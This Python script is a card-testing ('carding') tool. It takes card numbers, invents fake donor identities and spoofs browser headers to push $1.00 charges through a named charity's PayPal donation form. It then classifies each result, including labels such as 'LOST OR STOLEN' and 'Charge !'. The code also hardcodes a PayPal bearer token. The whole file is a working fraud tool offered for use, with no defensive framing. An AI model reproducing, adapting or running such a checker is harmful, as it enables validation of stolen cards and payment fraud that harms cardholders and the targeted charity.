import base64
import os
import random
import re
import time

import cloudscraper
import urllib3
from faker import Faker
from requests_toolbelt.multipart.encoder import MultipartEncoder
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake = Faker()

_REQUEST_TIMEOUT = 30

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William",
               "David", "Richard", "Joseph", "Thomas", "Charles"]
LAST_NAMES  = ["Smith", "Johnson", "Williams", "Brown", "Jones",
               "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
CITIES      = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix",
               "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
STATES      = [
    "AL","AK","AZ","AR","CA","CO","CT","DE","FL","GA","HI","ID","IL","IN",
    "IA","KS","KY","LA","ME","MD","MA","MI","MN","MS","MO","MT","NE","NV",
    "NH","NJ","NM","NY","NC","ND","OH","OK","OR","PA","RI","SC","SD","TN",
    "TX","UT","VT","VA","WA","WV","WI","WY"
]
STREET_NAMES = ["Main","Oak","Pine","Maple","Cedar","Elm",
                "Washington","Lake","Hill","Park"]

_DONATE_URL      = 'https://princessforaday.org/donations/custom-donation/'
_AJAX_URL        = 'https://princessforaday.org/wp-admin/admin-ajax.php'
_PAYPAL_CORS_URL = 'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source'

_FORM_ID_PREFIX  = "2244-1"
_FORM_ID         = "2244"
_FORM_HASH       = "2025615d00"

# ── PayPal auth token — loaded from env for security ──────────────────────────
_PAYPAL_AU_TOKEN = os.environ.get(
    "PAYPAL_AU_TOKEN",
    "A21AANf6TAno7lxl1BhsXBPppnXsiLPPhwNmjnmAScJk33zReCZn6M-0SB8DQHqNW8Zq6tbERHjna7cUC3RA84rgbWKO7H15A"
)

_BASE_HEADERS = {
    'origin':             'https://princessforaday.org',
    'referer':            _DONATE_URL,
    'sec-ch-ua':          '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile':   '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest':     'empty',
    'sec-fetch-mode':     'cors',
    'sec-fetch-site':     'same-origin',
    'user-agent':         ('Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
                           '(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'),
    'x-requested-with':   'XMLHttpRequest',
}


def _parse_card(ccx: str):
    """Return (number, mm, yy_2digit, cvc) or raise ValueError."""
    ccx = ccx.strip()
    # Normalize separators
    ccx = re.sub(r'[\s/]', '|', ccx)
    parts = ccx.split("|")
    if len(parts) < 4:
        raise ValueError(f"Invalid card format: {ccx!r} — expected NUM|MM|YY|CVV")
    n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    # Validate basic lengths
    if not n.isdigit() or len(n) < 13:
        raise ValueError(f"Invalid card number: {n!r}")
    if not mm.isdigit() or not (1 <= int(mm) <= 12):
        raise ValueError(f"Invalid expiry month: {mm!r}")
    if len(yy) == 4:
        yy = yy[2:]
    if not yy.isdigit():
        raise ValueError(f"Invalid expiry year: {yy!r}")
    if not cvc.isdigit() or not (3 <= len(cvc) <= 4):
        raise ValueError(f"Invalid CVV: {cvc!r}")
    return n, mm, yy, cvc


def _build_form_base(first_name, last_name, email, amount="1.00"):
    """Return the common multipart fields shared across donation steps."""
    return {
        'give-honeypot':          (None, ''),
        'give-form-id-prefix':    (None, _FORM_ID_PREFIX),
        'give-form-id':           (None, _FORM_ID),
        'give-form-title':        (None, ''),
        'give-current-url':       (None, _DONATE_URL),
        'give-form-url':          (None, _DONATE_URL),
        'give-form-minimum':      (None, amount),
        'give-form-maximum':      (None, '999999.99'),
        'give-form-hash':         (None, _FORM_HASH),
        'give-price-id':          (None, 'custom'),
        'give-recurring-logged-in-only': (None, ''),
        'give-logged-in-only':    (None, '1'),
        '_give_is_donation_recurring': (None, '0'),
        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
        'give-amount':            (None, amount),
        'give_stripe_payment_method': (None, ''),
        'payment-mode':           (None, 'paypal-commerce'),
        'give_first':             (None, first_name),
        'give_last':              (None, last_name),
        'give_email':             (None, email),
        'card_name':              (None, f"{first_name} {last_name}"),
        'card_exp_month':         (None, ''),
        'card_exp_year':          (None, ''),
        'give-gateway':           (None, 'paypal-commerce'),
    }


def ahmed(ccx: str) -> str:
    """
    Check a card via the PayPal Commerce gateway on princessforaday.org.
    Returns a plain-text status string.
    """
    try:
        n, mm, yy, cvc = _parse_card(ccx)
    except ValueError as e:
        return str(e)

    amount     = "1.00"
    first_name = random.choice(FIRST_NAMES)
    last_name  = random.choice(LAST_NAMES)
    email      = f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@gmail.com"

    sess = requests.Session()
    sess.verify = True  # Always verify SSL in production

    try:
        # Step 1: Fetch donation page to prime cookies
        sess.get(_DONATE_URL, headers=_BASE_HEADERS, timeout=_REQUEST_TIMEOUT)

        # Step 2: Initiate donation (plain form-data)
        init_data = {
            'give-honeypot':        '',
            'give-form-id-prefix':  _FORM_ID_PREFIX,
            'give-form-id':         _FORM_ID,
            'give-form-title':      '',
            'give-current-url':     _DONATE_URL,
            'give-form-url':        _DONATE_URL,
            'give-form-minimum':    amount,
            'give-form-maximum':    '999999.99',
            'give-form-hash':       _FORM_HASH,
            'give-price-id':        'custom',
            'give-amount':          amount,
            'give_stripe_payment_method': '',
            'payment-mode':         'paypal-commerce',
            'give_first':           first_name,
            'give_last':            last_name,
            'give_email':           email,
            'card_name':            f"{first_name} {last_name}",
            'card_exp_month':       '',
            'card_exp_year':        '',
            'give_action':          'purchase',
            'give-gateway':         'paypal-commerce',
            'action':               'give_process_donation',
            'give_ajax':            'true',
        }
        sess.post(_AJAX_URL, headers=_BASE_HEADERS,
                  data=init_data, timeout=_REQUEST_TIMEOUT)

        # Step 3: Create PayPal order
        order_fields = _build_form_base(first_name, last_name, email, amount)
        order_data   = MultipartEncoder(order_fields)
        order_headers = {**_BASE_HEADERS,
                         'content-type': order_data.content_type,
                         'x-requested-with': 'XMLHttpRequest'}
        order_resp = sess.post(
            _AJAX_URL,
            params={'action': 'give_paypal_commerce_create_order'},
            headers=order_headers,
            data=order_data,
            timeout=_REQUEST_TIMEOUT,
        )

        try:
            tok = order_resp.json()['data']['id']
        except (KeyError, ValueError, TypeError):
            return f"Order creation failed: {order_resp.text[:120]}"

        # Step 4: Confirm payment source with PayPal
        paypal_headers = {
            'authority':              'cors.api.paypal.com',
            'accept':                 '*/*',
            'accept-language':        'en-US,en;q=0.9',
            'authorization':          f'Bearer {_PAYPAL_AU_TOKEN}',
            'braintree-sdk-version':  '3.32.0-payments-sdk-dev',
            'content-type':           'application/json',
            'origin':                 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'referer':                'https://assets.braintreegateway.com/',
            'sec-ch-ua':              '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile':       '?1',
            'sec-ch-ua-platform':     '"Android"',
            'sec-fetch-dest':         'empty',
            'sec-fetch-mode':         'cors',
            'sec-fetch-site':         'cross-site',
            'user-agent':             _BASE_HEADERS['user-agent'],
        }
        sess.post(
            _PAYPAL_CORS_URL.format(tok=tok),
            headers=paypal_headers,
            json={
                'payment_source': {
                    'card': {
                        'number':        n,
                        'expiry':        f'20{yy}-{mm}',
                        'security_code': cvc,
                        'attributes': {
                            'verification': {'method': 'SCA_WHEN_REQUIRED'}
                        },
                    }
                },
                'application_context': {'vault': False},
            },
            timeout=_REQUEST_TIMEOUT,
        )

        # Step 5: Approve the order
        approve_fields = _build_form_base(first_name, last_name, email, amount)
        approve_data   = MultipartEncoder(approve_fields)
        approve_headers = {**_BASE_HEADERS,
                           'content-type': approve_data.content_type}
        approve_resp = sess.post(
            _AJAX_URL,
            params={'action': 'give_paypal_commerce_approve_order', 'order': tok},
            headers=approve_headers,
            data=approve_data,
            timeout=_REQUEST_TIMEOUT,
        )
        text = approve_resp.text

    except requests.exceptions.SSLError as e:
        return f"SSL Error: {str(e)[:80]}"
    except requests.exceptions.Timeout:
        return "Request timeout"
    except requests.exceptions.ConnectionError:
        return "Connection error"
    except Exception as e:
        return f"Error: {str(e)[:100]}"
    finally:
        sess.close()

    # Parse response
    _MAP = [
        ('true',                           "Charge !"),
        ('sucsess',                        "Charge !"),
        ('success',                        "Charge !"),
        ('DO_NOT_HONOR',                   "Do not honor"),
        ('ACCOUNT_CLOSED',                 "Account closed"),
        ('PAYER_ACCOUNT_LOCKED_OR_CLOSED', "Account closed"),
        ('LOST_OR_STOLEN',                 "LOST OR STOLEN"),
        ('CVV2_FAILURE',                   "Card Issuer Declined CVV"),
        ('SUSPECTED_FRAUD',                "SUSPECTED FRAUD"),
        ('INVALID_ACCOUNT',                "INVALID ACCOUNT"),
        ('REATTEMPT_NOT_PERMITTED',        "REATTEMPT NOT PERMITTED"),
        ('ACCOUNT BLOCKED BY ISSUER',      "ACCOUNT BLOCKED BY ISSUER"),
        ('ORDER_NOT_APPROVED',             "ORDER NOT APPROVED"),
        ('PICKUP_CARD_SPECIAL_CONDITIONS', "PICKUP CARD SPECIAL CONDITIONS"),
        ('PAYER_CANNOT_PAY',               "PAYER CANNOT PAY"),
        ('INSUFFICIENT_FUNDS',             "Insufficient Funds"),
        ('GENERIC_DECLINE',                "GENERIC DECLINE"),
        ('COMPLIANCE_VIOLATION',           "COMPLIANCE VIOLATION"),
        ('TRANSACTION_NOT PERMITTED',      "TRANSACTION NOT PERMITTED"),
        ('PAYMENT_DENIED',                 "PAYMENT DENIED"),
        ('INVALID_TRANSACTION',            "INVALID TRANSACTION"),
        ('RESTRICTED_OR_INACTIVE_ACCOUNT', "RESTRICTED OR INACTIVE ACCOUNT"),
        ('SECURITY_VIOLATION',             "SECURITY VIOLATION"),
        ('DECLINED_DUE_TO_UPDATED_ACCOUNT',"DECLINED DUE TO UPDATED ACCOUNT"),
        ('INVALID_OR_RESTRICTED_CARD',     "INVALID CARD"),
        ('EXPIRED_CARD',                   "EXPIRED CARD"),
        ('CRYPTOGRAPHIC_FAILURE',          "CRYPTOGRAPHIC FAILURE"),
        ('TRANSACTION_CANNOT_BE_COMPLETED',"TRANSACTION CANNOT BE COMPLETED"),
        ('DECLINED_PLEASE_RETRY',          "DECLINED PLEASE RETRY LATER"),
        ('TX_ATTEMPTS_EXCEED_LIMIT',       "EXCEED LIMIT"),
        ('3DS_FAILURE',                    "3DS AUTH FAILURE"),
        ('CARD_VELOCITY_EXCEEDED',         "CARD VELOCITY EXCEEDED"),
    ]
    for key, label in _MAP:
        if key in text:
            return label

    try:
        err = approve_resp.json()['data']['error']
        return err if err else "UNKNOWN_ERROR"
    except Exception:
        return "UNKNOWN_ERROR"
